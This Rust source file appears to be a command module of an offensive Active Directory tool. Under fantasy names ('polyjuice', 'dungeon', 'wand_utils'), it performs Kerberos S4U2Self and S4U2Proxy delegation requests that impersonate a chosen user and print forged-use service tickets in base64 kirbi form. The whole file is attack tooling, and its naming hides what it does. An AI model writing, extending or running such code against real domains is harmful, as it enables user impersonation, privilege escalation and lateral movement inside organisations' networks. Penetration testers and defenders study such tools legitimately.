use anyhow::{bail, Result};
use std::collections::HashMap;
use crate::dungeon::display_charm::*;
use crate::dungeon::polyjuice_brew;
use crate::dungeon::wand_utils;

pub struct Polyjuice;

impl super::Spell for Polyjuice {
    fn incantation(&self) -> &'static str { "polyjuice" }
    fn grimoire(&self) -> &'static str {
        "S4U2Self + S4U2Proxy delegation. /impersonate: /spn: /ticket: /domain: [/targetspn:] [/dc:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let impersonate = args.get("impersonate").ok_or_else(|| anyhow::anyhow!("/impersonate: required"))?;
        let spn         = args.get("spn").ok_or_else(|| anyhow::anyhow!("/spn: required"))?;
        let tgt_b64     = args.get("ticket").ok_or_else(|| anyhow::anyhow!("/ticket: required"))?;
        let domain      = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let dc          = args.get("dc").map(|s| s.as_str());
        let kirbi = wand_utils::b64_to_kirbi(tgt_b64)?;

        print_banner(&format!("S4U2Self: impersonating {} for {}", impersonate, spn));
        let s4u_resp = polyjuice_brew::s4u2self(impersonate, spn, &kirbi, domain, dc)?;

        if let Some(target_spn) = args.get("targetspn") {
            print_banner(&format!("S4U2Proxy: targeting {}", target_spn));
            let proxy_resp = polyjuice_brew::s4u2proxy(&s4u_resp, target_spn, &kirbi, domain, dc)?;
            print_success("S4U2Proxy ticket obtained");
            println!("{}", wand_utils::kirbi_to_b64(&proxy_resp));
        } else {
            print_success("S4U2Self ticket obtained");
            println!("{}", wand_utils::kirbi_to_b64(&s4u_resp));
        }
        Ok(())
    }
}
